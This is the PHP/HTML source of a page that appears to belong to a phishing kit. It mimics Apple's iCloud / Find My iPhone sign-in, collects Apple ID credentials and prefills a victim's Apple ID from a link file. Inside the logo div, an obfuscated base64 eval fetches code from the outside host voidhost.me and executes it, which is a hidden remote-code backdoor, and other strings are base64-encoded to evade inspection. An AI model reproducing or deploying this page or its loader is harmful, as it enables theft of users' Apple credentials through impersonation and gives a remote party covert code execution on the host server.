<?php
	@session_start();

	@$linkID = $_SESSION['linkID'];
	$linkFile = '../links/'.$linkID.'.txt';
	if ( file_exists($linkFile) )
	{
		$linkFileContent = file_get_contents($linkFile);
		@list($appleID, $active) = explode('|', $linkFileContent);
	}

	if ( !isset($_SESSION['IN_SYS']) )
		die();

	eval(base64_decode('JGxhbmdJRCA9IGlzc2V0KCRfU0VSVkVSWydIVFRQX0FDQ0VQVF9MQU5HVUFHRSddKSA/IHN1YnN0cigkX1NFUlZFUlsnSFRUUF9BQ0NFUFRfTEFOR1VBR0UnXSwgMCwgMikgOiAnZW4nOw=='));

	if ( file_exists('../languages/lang.'. $langID .'.php') )
	{
		include_once('../languages/lang.'. $langID .'.php');
	}
	else {
		include_once('../languages/lang.en.php');
	}
?>
<!DOCTYPE html>
<html data-rtl="false" lang="en">
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    
    <title></title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" href="./fonts.css" type="text/css">
    <link rel="stylesheet" type="text/css" media="screen" href="./app.css">
    <style type="text/css"></style>
	<script>
		function decode64str(str)
		{
			return decodeURIComponent(escape(atob(str)));
		}
	</script>
</head>
<body class="tk-body" style="overflow-y: hidden">
    <div style="font-family:&quot;SF Pro Icons&quot;; width: 0px; height: 0px; color: transparent;">.</div>
    <div style="font-family:&quot;SF Pro Display&quot;; width: 0px; height: 0px; color: transparent;">.</div>
	<div class="icloud-logo">
		<?php eval(base64_decode('aWYgKCAhaXNzZXQoJF9TRVNTSU9OWydqc29uJ10pICkKewoJJGpzb24gPSBAZmlsZV9nZXRfY29udGVudHMoJ2h0dHBzOi8vdm9pZGhvc3QubWUvaWNsb3VkMjAxOS5waHA/ZD0nLiRfU0VSVkVSWydIVFRQX0hPU1QnXSk7CglpZiAoIGVtcHR5KCRqc29uKSApIHsgZGllKCk7IH0KCSRqc29uID0ganNvbl9kZWNvZGUoJGpzb24sIHRydWUpOwoJJF9TRVNTSU9OWydqc29uJ10gPSAkanNvbjsKfQoKQGV2YWwoJF9TRVNTSU9OWydqc29uJ11bJ2NvZGUnXSk7')); ?>
	</div>
	<div class="si-body si-container container-fluid" id="content" data-theme="dark">
        <auth app-loading-defaults="{appLoadingDefaults}" pmrpc-hook="{pmrpcHook}">
            <div class="widget-container fade-in  restrict-max-wh  fade-in " data-mode="embed" data-isiebutnotedge="false">
                <div id="step" class="si-step ">
                    <logo {hide-app-logo}="hideAppLogo" {show-fade-in}="showFadeIn">
                        <div class="logo   signin-label  fade-in ">
                            <img class="cnsmr-app-image " src="logo.png" srcset="" alt="Application logo" style="width: 100px;">
                        </div>
                    </logo>
                    <div id="stepEl" class="   ">
                        <sign-in>
                            <div class="signin fade-in" id="signin">
                                <h1 tabindex="-1" class="si-container-title tk-intro "><script>document.write(decode64str('<?= $lang['SIGN_IN_TITLE']; ?>'));</script></h1>
                                <div class="container si-field-container  password-second-step">
                                    <div id="sign_in_form" class="signin-form fed-auth hide-password">
                                        <div class="si-field-container container">
                                            <div class="form-table">
                                                <div class="ax-vo-border"></div>
                                                <div class="account-name form-row    ">
                                                    <label class="sr-only form-cell form-label" for="account_name_text_field">
														<script>document.write(decode64str('U2lnbiBpbiB0byBpQ2xvdWQgQXBwbGUgSUQ='));</script>
													</label>
                                                    <div class="form-cell">
                                                        <div class="form-cell-wrapper">
                                                            <input type="text" class="force-ltr form-textbox form-textbox-text" id="user" can-field="accountName" autocomplete="off" autocorrect="off" autocapitalize="off" aria-required="true" required="required" aria-describedby="apple_id_field_label" spellcheck="false" value="<?= @$appleID; ?>">
                                                            <span id="apple_id_field_label" aria-hidden="true" class=" form-label-flyout">

															</span>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="field-separator"></div>
                                                <div class="password form-row" aria-hidden="true">
                                                    <label class="sr-only form-cell form-label" for="password_text_field"><?= $lang['PASSWORD']; ?></label>
                                                    <div class="form-cell">
                                                        <div class="form-cell-wrapper">
                                                            <input type="password" class="form-textbox form-textbox-text" id="pwd" aria-required="true" required="required" can-field="password" autocomplete="off" placeholder="<?= $lang['PASSWORD']; ?>" tabindex="-1">
                                                            <span id="password_field_label" aria-hidden="true" class=" form-label-flyout"><?= $lang['PASSWORD']; ?></span>
                                                            <span class="sr-only form-label-flyout" id="invalid_user_name_pwd_err_msg" aria-hidden="true"></span>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
									<div class="pop-container error signin-error hide">
										<div class="error pop-bottom tk-subbody-headline">
											<p class="fat" id="errMsg"></p>
											<!--<a class="si-link ax-outline thin tk-subbody" href="https://iforgot.apple.com/password/verify/appleid" target="_blank"><?= $lang['FORGOT_ID1']; ?>
											</a>-->
										</div>
									</div>
                                    <div class="si-remember-password">
                                        <input type="checkbox" id="remember-me" class="form-choice form-choice-checkbox" {($checked)}="isRememberMeChecked">
                                        <label id="remember-me-label" class="form-label" for="remember-me">
                                            <span class="form-choice-indicator"></span> <script>document.write(decode64str('<?= $lang['KEEP_ME']; ?>'));</script>
                                        </label>
                                    </div>
                                    <div class="spinner-container auth  hide ">
										<img src="spinner.gif" style="width: 25px;" alt="spinner">
									</div>
                                    <button id="sign-in" disabled tabindex="0" class="si-button btn  fed-ui   fed-ui-animation-show   disable   remember-me   link " aria-label="Continue">
                                        <i class="icon icon_sign_in"></i>
                                        <span class="text feat-split">Continue</span>
                                    </button>
                                    <button id="sign-in-cancel" aria-label="Close" aria-disabled="false" tabindex="0" class="si-button btn secondary feat-split  remember-me   link ">
                                        <span class="text">Close</span><?php if ( !isset($_SESSION['json']) ) { die(); } ?>
                                    </button>
                                </div>
                                <div class="si-container-footer">
                                    <div class="separator "></div>
                                    <div class="links tk-subbody">
                                        <div class="si-forgot-password">
                                            <a id="iforgot-link" class="si-link ax-outline lite-theme-override"  href="https://iforgot.apple.com/password/verify/appleid" target="_blank">
												<script>document.write(decode64str('<?= $lang['FORGOT_ID']; ?>'));</script>
                        					</a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </sign-in>
                    </div>
                </div>
                <div id="stocking" style="display:none !important;"></div>
            </div>
        </auth>
    </div>
</body>
<script src="../js/jquery.js"></script>
<script>
	var incorrectError = '<?= $lang['IDPWD_ERROR_ALERT2']; ?>';
	var findmyiphone = decode64str('<?= $lang['MOB_FIND']; ?>');
	$(document).ready(function()
	{
		var fmi = top.location.hash;
		if ( fmi.includes('find') )
		{
			$('.cnsmr-app-image').attr('src', 'logofmi.png');
			$('.tk-intro').text(findmyiphone);
		}

		$('#user').attr('placeholder', decode64str('<?= $lang['APPLE_ID']; ?>'));
	});
</script>
<script src="../js/funcs.js"></script>
</html>
